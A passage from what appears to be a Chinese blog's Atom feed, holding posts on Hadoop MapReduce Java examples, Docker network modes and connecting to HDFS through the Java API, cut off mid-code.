    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>MapReduce是Google提出的一个软件架构，用于大规模数据集（大于1TB）的并行运算。概念“Map（映射”和“Reduce（归纳）”，及他们的主要思想，都是从函数式编程语言借来的，还有从矢量编程语言借来的特性。<br>关于其原理，网上有很多资料，这里不细讲。<br>笔者也仅是入门，此篇仅贴出入门的几个编程例子。</p><h2 id="0x01-代码"><a href="#0x01-代码" class="headerlink" title="0x01 代码"></a>0x01 代码</h2><p>给出的例子使用java api,利用IDEA远程连接。<br>代码实现了几个简单的map 及reduce例子</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> hadoop;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.StringTokenizer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.ObjectUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.conf.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.fs.Path;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.lib.input.FileInputFormat;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.util.GenericOptionsParser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Map_reduce</span> </span>&#123;</span><br><span class="line">   <span class="comment">//统计词频</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">TokenizerMapper</span> <span class="keyword"><span class="keyword">extends</span> <span class="type">Mapper</span></span>&lt;<span class="title">Object</span>, <span class="title">Text</span>, <span class="title">Text</span>, <span class="title">IntWritable</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">private</span> final <span class="keyword">static</span> IntWritable one = <span class="keyword">new</span> <span class="type">IntWritable</span>(<span class="number">1</span>);</span><br><span class="line">       <span class="keyword">private</span> Text word = <span class="keyword">new</span> <span class="type">Text</span>();</span><br><span class="line"></span><br><span class="line">       <span class="keyword">public</span> void map(Object key, Text value, Context context</span><br><span class="line">       ) throws IOException, InterruptedException &#123;</span><br><span class="line">           StringTokenizer itr = <span class="keyword">new</span> <span class="type">StringTokenizer</span>(value.toString());</span><br><span class="line">           <span class="keyword">while</span> (itr.hasMoreTokens()) &#123;</span><br><span class="line">               word.<span class="keyword">set</span>(itr.nextToken());</span><br><span class="line">               context.write(word, one);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">//统计大小写字母、数字、其他频率</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">ZimuMapper</span> <span class="keyword"><span class="keyword">extends</span> <span class="type">Mapper</span></span>&lt;<span class="title">Object</span>, <span class="title">Text</span>, <span class="title">Text</span>, <span class="title">IntWritable</span>&gt;</span></span><br><span class="line"><span class="class">   </span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="comment">//private final static IntWritable one = new IntWritable(1);</span></span><br><span class="line">       <span class="comment">//private Text word = new Text();</span></span><br><span class="line"></span><br><span class="line">       <span class="keyword">public</span> void map(Object key, Text value, Context context</span><br><span class="line">       ) throws IOException, InterruptedException &#123;</span><br><span class="line">           <span class="keyword">String</span> str = value.toString();</span><br><span class="line">           <span class="keyword">for</span>(int i=<span class="number">0</span>;i&lt;str.length();i++)&#123;</span><br><span class="line">               char ch = str.charAt(i);</span><br><span class="line">               <span class="keyword">if</span>(ch&gt;=<span class="string">'a'</span>&amp;&amp;ch&lt;=<span class="string">'z'</span>)</span><br><span class="line">                   context.write(<span class="keyword">new</span> <span class="type">Text</span>(<span class="string">"Lowwer"</span>),<span class="keyword">new</span> <span class="type">IntWritable</span>(<span class="number">1</span>));</span><br><span class="line">               <span class="keyword">else</span> <span class="keyword">if</span> (ch&gt;=<span class="string">'A'</span>&amp;&amp;ch&lt;=<span class="string">'Z'</span>)&#123;</span><br><span class="line">                   context.write(<span class="keyword">new</span> <span class="type">Text</span>(<span class="string">"Upper"</span>),<span class="keyword">new</span> <span class="type">IntWritable</span>(<span class="number">1</span>));</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">else</span> <span class="keyword">if</span>(ch&gt;=<span class="string">'0'</span>&amp;&amp;ch&lt;=<span class="string">'9'</span>)</span><br><span class="line">               &#123;</span><br><span class="line">                   context.write(<span class="keyword">new</span> <span class="type">Text</span>(<span class="string">"Nummer"</span>),<span class="keyword">new</span> <span class="type">IntWritable</span>(<span class="number">1</span>));</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">else</span>&#123;</span><br><span class="line">                   context.write(<span class="keyword">new</span> <span class="type">Text</span>(<span class="string">"Else"</span>),<span class="keyword">new</span> <span class="type">IntWritable</span>(<span class="number">1</span>));</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">//统计每个字母个数</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">geshuMapper</span> <span class="keyword"><span class="keyword">extends</span> <span class="type">Mapper</span></span>&lt;<span class="title">Object</span>, <span class="title">Text</span>, <span class="title">Text</span>, <span class="title">IntWritable</span>&gt;</span></span><br><span class="line"><span class="class">   </span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="comment">//private final static IntWritable one = new IntWritable(1);</span></span><br><span class="line">       <span class="comment">//private Text word = new Text();</span></span><br><span class="line"></span><br><span class="line">       <span class="keyword">public</span> void map(Object key, Text value, Context context</span><br><span class="line">       ) throws IOException, InterruptedException &#123;</span><br><span class="line">           <span class="keyword">String</span> str = value.toString();</span><br><span class="line">           <span class="keyword">for</span>(int i=<span class="number">0</span>;i&lt;str.length();i++)&#123;</span><br><span class="line">               char ch = str.charAt(i);</span><br><span class="line">               context.write(<span class="keyword">new</span> <span class="type">Text</span>(<span class="keyword">String</span>.valueOf(ch)),<span class="keyword">new</span> <span class="type">IntWritable</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//最长单词</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MaxworldMapper</span> <span class="keyword"><span class="keyword">extends</span> <span class="type">Mapper</span></span>&lt;<span class="title">Object</span>, <span class="title">Text</span>, <span class="title">IntWritable</span>, <span class="title">Text</span>&gt;</span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> final <span class="keyword">static</span> IntWritable one = <span class="keyword">new</span> <span class="type">IntWritable</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">private</span> Text word = <span class="keyword">new</span> <span class="type">Text</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> void map(Object key, Text value, Context context</span><br><span class="line">        ) throws IOException, InterruptedException &#123;</span><br><span class="line">            StringTokenizer itr = <span class="keyword">new</span> <span class="type">StringTokenizer</span>(value.toString());</span><br><span class="line">            <span class="keyword">while</span> (itr.hasMoreTokens()) &#123;</span><br><span class="line">                word.<span class="keyword">set</span>(itr.nextToken());</span><br><span class="line">                context.write(one, word);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 最长词频reduce</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MaxworldReducer</span></span></span><br><span class="line"><span class="class">            <span class="keyword"><span class="keyword">extends</span> <span class="type">Reducer</span></span>&lt;<span class="title">IntWritable</span>,<span class="title">Text</span>,<span class="title">Text</span>,<span class="title">IntWritable</span>&gt; </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> IntWritable result = <span class="keyword">new</span> <span class="type">IntWritable</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> void reduce(IntWritable key, Iterable&lt;Text&gt; values,</span><br><span class="line">                           Context context</span><br><span class="line">        ) throws IOException, InterruptedException &#123;</span><br><span class="line">            int num = <span class="number">0</span>;</span><br><span class="line">            Text k = <span class="keyword">new</span> <span class="type">Text</span>();</span><br><span class="line">            <span class="keyword">for</span>(Text val:<span class="type">values</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(num &lt;val.getLength())</span><br><span class="line">                &#123;</span><br><span class="line">                    num = val.getLength();</span><br><span class="line">                    k= val;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            result.<span class="keyword">set</span>(num);</span><br><span class="line">            context.write(k, <span class="keyword">new</span> <span class="type">IntWritable</span>(num));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//词频统计</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">IntSumReducer</span></span></span><br><span class="line"><span class="class">                <span class="keyword"><span class="keyword">extends</span> <span class="type">Reducer</span></span>&lt;<span class="title">Text</span>,<span class="title">IntWritable</span>,<span class="title">Text</span>,<span class="title">IntWritable</span>&gt; </span>&#123;</span><br><span class="line">            <span class="keyword">private</span> IntWritable result = <span class="keyword">new</span> <span class="type">IntWritable</span>();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> void reduce(Text key, Iterable&lt;IntWritable&gt; values,</span><br><span class="line">                               Context context</span><br><span class="line">            ) throws IOException, InterruptedException &#123;</span><br><span class="line">                int sum = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span> (IntWritable val : <span class="type">values</span>) &#123;</span><br><span class="line">                    sum += val.<span class="keyword">get</span>();</span><br><span class="line">                &#125;</span><br><span class="line">                result.<span class="keyword">set</span>(sum);</span><br><span class="line">                context.write(key, result);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> void main(<span class="keyword">String</span>[] args) throws Exception &#123;</span><br><span class="line">            Configuration conf = <span class="keyword">new</span> <span class="type">Configuration</span>();</span><br><span class="line">            <span class="keyword">String</span> inPutPath = <span class="string">"hdfs://192.168.111.151:9000/user/input/"</span>;</span><br><span class="line">            <span class="keyword">String</span> outPutPath = <span class="string">"hdfs://192.168.111.151:9000/user/output"</span>;</span><br><span class="line"></span><br><span class="line">            Job job = Job.getInstance(conf, <span class="string">"word count"</span>);</span><br><span class="line">            job.setJarByClass(Map_reduce.class);</span><br><span class="line">            <span class="comment">//job.setMapperClass(TokenizerMapper.class);</span></span><br><span class="line">            <span class="comment">//job.setMapperClass(ZimuMapper.class);</span></span><br><span class="line">            <span class="comment">//job.setCombinerClass(IntSumReducer.class);</span></span><br><span class="line">            <span class="comment">//job.setReducerClass(IntSumReducer.class);</span></span><br><span class="line">            <span class="comment">//选择合适的map reduce 类</span></span><br><span class="line">            job.setMapperClass(geshuMapper.class);</span><br><span class="line">            job.setReducerClass(IntSumReducer.class);</span><br><span class="line">            <span class="comment">//改输出类型</span></span><br><span class="line"><span class="comment">//job.setMapOutputKeyClass(IntWritable.class);</span></span><br><span class="line"><span class="comment">//ob.setMapOutputValueClass(Text.class);</span></span><br><span class="line">            job.setOutputKeyClass(Text.class);</span><br><span class="line">            job.setOutputValueClass(IntWritable.class);</span><br><span class="line">            FileInputFormat.addInputPath(job,<span class="keyword">new</span> <span class="type">Path</span>(inPutPath));</span><br><span class="line">            FileOutputFormat.setOutputPath(job,<span class="keyword">new</span> <span class="type">Path</span>(outPutPath));</span><br><span class="line">            System.exit(job.waitForCompletion(<span class="literal">true</span>) ? <span class="number">0</span> : <span class="type">1</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;MapReduce是Google提出的一个软件架构，用于大规模数据集（大于1TB）的并行运算。概念“
      
    
    </summary>
    
      <category term="环境配置" scheme="https://zhengbao.wang/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    
    
      <category term="hadoop" scheme="https://zhengbao.wang/tags/hadoop/"/>
    
  </entry>
  
  <entry>
    <title>Docker网络模式详解</title>
    <link href="https://zhengbao.wang/Docker%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%BC%8F%E8%AF%A6%E8%A7%A3/"/>
    <id>https://zhengbao.wang/Docker网络模式详解/</id>
    <published>2019-04-01T12:50:42.000Z</published>
    <updated>2019-04-02T01:12:40.857Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在最近使用docker搭建环境的过程中，发现docker容器默认的网络模式并不能很好的满足需求，然后便查看了一下docker关于网络配置的<a href="https://docs.docker.com/network/" target="_blank" rel="noopener">官方文档</a>，发现在官方文档中,给出了五种docker的网络模式，还是能比较全面的满足各种需求的，下面介绍一下这几种模式。</p><h2 id="0x01-bridge模式"><a href="#0x01-bridge模式" class="headerlink" title="0x01 bridge模式"></a>0x01 bridge模式</h2><p>bridge模式，这是docker容器启动时默认的网络模式，当启动容器时不提供<code>--net</code>参数时，docker容器便默认以这种模式配置网络环境。这也是在使用docker容器时，最常用的网络模式。<br>关于桥接模式，官方文档时这样说的<code>当您的应用程序在需要通信的独立容器中运行时，通常会使用桥接网络</code>。<br>简单画了个图帮助理解这种模式<br><img src="https://i.loli.net/2019/04/01/5ca1fc408a530.png" alt></p><p>实际演示：<br>首先使用默认模式即桥接模式启动两个docker容器,并查看其ip<br><img src="https://i.loli.net/2019/04/01/5ca1fcf6edf1f.png" alt><br>测试两台容器间互通<br><img src="https://i.loli.net/2019/04/01/5ca1fdb37bd30.png" alt><br>通过命令<code>docker exec bridge1 ip addr show</code>看到两个容器均虚拟出了自己的网卡<code>eth0</code><br><img src="https://i.loli.net/2019/04/01/5ca2006ed9253.png" alt><br>查看宿主机网卡，可发现多出来<code>docker0</code>，而此网卡即为各桥接模式启动的容器的网关<br><img src="https://i.loli.net/2019/04/01/5ca1fde0568e0.png" alt><br>同时宿主机上还多出来两个<code>veth</code>开头的网卡，其伴随着桥接模式容器的<code>eth0</code>网卡出现而出现。其作用为连通docker0与容器内网卡eth0。因此docker0并不只是一个简单的网卡了，而是一个网桥。<br><img src="https://i.loli.net/2019/04/01/5ca1fefd9ccfa.png" alt></p><h2 id="0x02-host模式"><a href="#0x02-host模式" class="headerlink" title="0x02 host模式"></a>0x02 host模式</h2><p>使用host模式时容器将不会获得一个独立的Network Namespace，而是和宿主机共用一个Network Namespace。容器将不会虚拟出自己的网卡，配置自己的IP等，而是使用宿主机的IP和端口。但是，容器的其他方面，如文件系统、进程列表等还是和宿主机隔离的。<br>实际演示<br><code>docker run -itd  --net=host --name=host awd_zentao /bin/bash</code><br>查看其网卡发现其与主机一样<br><img src="https://i.loli.net/2019/04/01/5ca2022710509.png" alt></p><h2 id="0x03-container模式"><a href="#0x03-container模式" class="headerlink" title="0x03 container模式"></a>0x03 container模式</h2><p>该模式类似于host模式，只不过host模式是主机与容器共享Network Namespace,而container模式是容器之间共享Network Namespace。新创建的容器不会创建自己的网卡，配置自己的 IP，而是和一个指定的容器共享 IP、端口范围等。同样，两个容器除了网络方面，其他的如文件系统、进程列表等还是隔离的。两个容器的进程可以通过 lo 网卡设备通信。<br>实际演示：<br>其配置方式为<code>--net=container:&lt;name_or_id&gt;</code><br>这里选择与之前的bridge1共享<br><img src="https://i.loli.net/2019/04/01/5ca2071085441.png" alt></p><h2 id="0x04-none模式"><a href="#0x04-none模式" class="headerlink" title="0x04 none模式"></a>0x04 none模式</h2><p>使用none模式不会对docker容器进行任何网络配置，只有lo本地环回网络，Docker容器没有网卡、IP、路由等信息。需要我们自己为Docker容器添加网卡、配置IP等。<br>实际演示：<br><img src="https://i.loli.net/2019/04/01/5ca2084a0187d.png" alt></p><h2 id="0x05-macvlan模式"><a href="#0x05-macvlan模式" class="headerlink" title="0x05 macvlan模式"></a>0x05 macvlan模式</h2><p>本次学习正式因为想搭建docker集群与宿主机在同一个c段，以使宿主机同c段主机可以连同docker容器，本来也可以使用bridge模式加端口映射的方法，但发现使用macvlan方式更为合适。<br>macvlan模式可以创建出一个新的自定义模式，其新启动的容器可以按新的模式配置网络环境。<br>实例演示：<br>创建新的macvlan<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker<span class="built_in"> network </span>create -d macvlan  <span class="attribute">--subnet</span>=192.168.111.0/24 <span class="attribute">--gateway</span>=192.168.111.1 -o <span class="attribute">parent</span>=ens33 gitlab-net</span><br></pre></td></tr></table></figure></p><p>使用<code>docker network ls</code>可以看到新创建的gitlab-net网络<br><img src="https://i.loli.net/2019/04/01/5ca2039cb202a.png" alt></p><p>使用<code>docker run --net=gitlab-net --ip=192.168.111.201 -dit --name test1 awd_zentao</code>即可创建新的容器，可通过<code>--net=gitlab-net</code>指定其为新的模式,<code>--ip</code>参数指定容器ip<br>查看其网卡信息<br><img src="https://i.loli.net/2019/04/01/5ca20480b8cfa.png" alt></p><p>相对于前面几种模式，该模式更加灵活，可根据实际需求配置出新的模式，满足较为复杂的网络需求。</p><h2 id="0x06-overlay模式"><a href="#0x06-overlay模式" class="headerlink" title="0x06 overlay模式"></a>0x06 overlay模式</h2><p>overlay模式可用于连接不同机器上的docker容器，允许不同机器上的容器相互通信，同时支持对消息进行加密。<br>笔者暂时未用过该模式，具体可参考<a href="https://docs.docker.com/network/overlay/" target="_blank" rel="noopener">https://docs.docker.com/network/overlay/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;在最近使用docker搭建环境的过程中，发现docker容器默认的网络模式并不能很好的满足需求，然后
      
    
    </summary>
    
      <category term="环境配置" scheme="https://zhengbao.wang/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    
    
      <category term="docker" scheme="https://zhengbao.wang/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>使用Hadoop JAVA API 远程连接HDFS</title>
    <link href="https://zhengbao.wang/%E4%BD%BF%E7%94%A8Hadoop-JAVA-API-%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5HDFS/"/>
    <id>https://zhengbao.wang/使用Hadoop-JAVA-API-远程连接HDFS/</id>
    <published>2019-03-29T13:43:10.000Z</published>
    <updated>2019-05-08T02:40:43.496Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>关于hadoop的搭建，可以参考之前的一篇文章<a href="http://zhengbao.wang/Centos7%E6%90%AD%E5%BB%BAHadoop%E4%BC%AA%E5%88%86%E5%B8%83%E5%BC%8F%E9%9B%86%E7%BE%A4%E8%AF%A6%E7%BB%86%E6%AD%A5%E9%AA%A4/">Centos7搭建Hadoop伪分布式集群详细步骤</a><br>本篇主要讲解如何使用Hadoop java api远程连接hadoop分布式文件系统（HDFS）</p><h2 id="0x01-本地操作HDFS"><a href="#0x01-本地操作HDFS" class="headerlink" title="0x01 本地操作HDFS"></a>0x01 本地操作HDFS</h2><p>在远程连接HDFS之前，先本地操作一波，便于对HDFS有个更深层的认识。</p><p>首先应该对HDFS的概念有个认识，他就是一个文件系统，只不过是适应于hadoop的分布式文件系统，既然是文件系统，其就可以执行跟普通文件系统一样的操作，例如文件操作，目录操作等。<br>下面演示几个简单的例子。</p><ul><li><p>列出目录文件<br><code>hadoop fs -ls \</code><br><img src="https://i.loli.net/2019/03/29/5c9e1850124c7.png" alt></p></li><li><p>创建文件<br><code>hadoop fs -touchz /hello</code><br><img src="https://i.loli.net/2019/03/29/5c9e19572a8b5.png" alt></p></li></ul><p>更多命令参考<a href="https://segmentfault.com/a/1190000002672666" target="_blank" rel="noopener">hadoop HDFS常用文件操作命令</a></p><h2 id="0x02-IDEA远程连接HDFS"><a href="#0x02-IDEA远程连接HDFS" class="headerlink" title="0x02 IDEA远程连接HDFS"></a>0x02 IDEA远程连接HDFS</h2><h3 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h3><p>首先在windows环境下安装hadoop并配置环境变量。<br>windows下配置java jdk。<br>下载winutils：<a href="https://github.com/steveloughran/winutils" target="_blank" rel="noopener">https://github.com/steveloughran/winutils</a><br>按照自己hadoop版本选择<code>hadoop.dll</code> <code>winutils.exe</code>放到hadoop bin目录下<br><img src="https://i.loli.net/2019/03/29/5c9e1c1fc8e2c.png" alt></p><h3 id="建立工程"><a href="#建立工程" class="headerlink" title="建立工程"></a>建立工程</h3><p>在IDEA下新建Maven工程<br><img src="https://i.loli.net/2019/03/29/5c9e1cba5d20a.png" alt></p><p>创建过程中右下角会出现import提醒，点击import。</p><p>创建完成后下载对应版本的hadoop pom.xml文件<br>这里我的为<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.hadoop<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hadoop-common<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.hadoop<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hadoop-mapreduce-client-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.hadoop<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hadoop-client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.hadoop<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hadoop-hdfs<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>将之前配置的<code>core-site.xml</code> <code>hdfs-site.xml</code> <code>log4j.properties</code>复制到resources目录</p><p>目录结构如下<br><img src="https://i.loli.net/2019/03/29/5c9e1dbc73a0e.png" alt></p><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>新建class<br><img src="https://i.loli.net/2019/03/29/5c9e1e0813184.png" alt><br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 